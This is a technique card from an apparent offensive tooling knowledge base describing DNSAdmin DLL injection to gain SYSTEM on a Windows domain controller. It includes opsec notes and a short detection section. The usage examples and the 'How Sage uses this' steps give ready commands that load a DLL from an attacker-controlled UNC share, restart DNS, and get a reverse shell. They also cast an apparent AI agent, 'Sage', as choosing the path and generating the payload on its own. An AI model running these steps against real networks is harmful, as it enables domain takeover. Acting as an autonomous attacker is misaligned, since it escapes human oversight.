---
name: DNSAdmin DLL Injection
category: privilege-escalation
subcategories: [dnsadmin-abuse, dll-injection, domain-privesc]
tradecraft_tags: [dns, dnsadmin, dll-injection, privilege-escalation, active-directory]
mitre_attack:
  - id: T1574.002
    name: Hijack Execution Flow — DLL Side-Loading
source:
  url: https://adsecurity.org/?p=4064
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  DNS server configuration changes (via dnscmd or RPCSS) are logged in DNS Server
  operational logs and generate Event 770 in DNS server event log. DLL load by
  dns.exe (svchost hosting DNS) from an unusual path is detectable by behavioral EDR
  (Sysmon event 7, ImageLoad). The dnscmd /config call that sets the plugin DLL
  generates a registry write on the DC.
usage_examples:
  - description: Configure DNS server to load attacker DLL (requires DNSAdmins group membership)
    args: "dnscmd DC01 /config /serverlevelplugindll \\\\ATTACKER\\share\\payload.dll"
  - description: Restart DNS service to trigger DLL load
    args: "sc stop dns && sc start dns (or via net stop/start)"
  - description: Clean up after exploitation
    args: "dnscmd DC01 /config /serverlevelplugindll ''"
opsec_notes: |
  DNSAdmin DLL injection requires membership in the DNSAdmins group (uncommon — check
  group memberships first). The DLL loads in the context of dns.exe running as SYSTEM
  on the DC. This is a very high-value escalation path (user → SYSTEM on a DC), but
  also extremely noisy — DNS service restart is visible to operations. The DLL must be
  on a UNC path accessible from the DC (attacker-controlled SMB share or a path on the DC).
gotchas: |
  This is a TECHNIQUE, not a tool — use dnscmd.exe (built-in Windows) for configuration.
  Requires actual membership in the DNSAdmins AD group (verify with `net group DNSAdmins /domain`
  or SharpHound). DNS service restart interrupts DNS resolution briefly — disruptive in
  production environments. The UNC path DLL requires the DC to reach the attacker's SMB
  share OR the DLL must be pre-placed on the DC itself. Clean up by resetting the plugin DLL
  to empty string and restarting DNS again.
related_ttps: [sharpup, powerview, sharphound, mimikatz]
alternatives: [sharpgpoabuse, constrained-delegation-abuse]
common_args: {}
last_updated: 2026-05-29
---

# DNSAdmin DLL Injection

A technique (not a specific tool) that abuses Windows DNS Server plugin DLL functionality
to load an arbitrary DLL in the context of dns.exe (SYSTEM) on a domain controller.
Members of the DNSAdmins group can configure the DNS server plugin DLL path via `dnscmd`
(a built-in Windows tool). When the DNS service restarts, it loads the attacker's DLL
as SYSTEM on the DC.

## Typical use cases
- Escalate from DNSAdmins group member to SYSTEM on a domain controller
- Domain privilege escalation without requiring DA or DCSync rights

## How Sage uses this
When SharpHound identifies a controlled principal in the DNSAdmins group, this technique
is Sage's escalation path to SYSTEM on the DC. Sage uses `dnscmd` (built-in), requiring
no binary upload. Steps:
1. Verify DNSAdmins membership (SharpHound or PowerView)
2. Stage DLL at accessible UNC path or on DC
3. Configure: `dnscmd DC01 /config /serverlevelplugindll \\\\ATTACKER\\share\\payload.dll`
4. Restart DNS: `sc \\\\DC01 stop dns && sc \\\\DC01 start dns`
5. DLL executes as SYSTEM; reverse shell or Apollo callback
6. Cleanup: reset plugin DLL to empty, restart DNS

## Output
DLL execution under dns.exe context. The payload runs as NT AUTHORITY\SYSTEM on the DC.

## Apollo-specific note
Uses built-in dnscmd.exe via shell command — no binary upload required. The DLL is
the payload; Sage would generate it for the operator or stage it on available infrastructure.
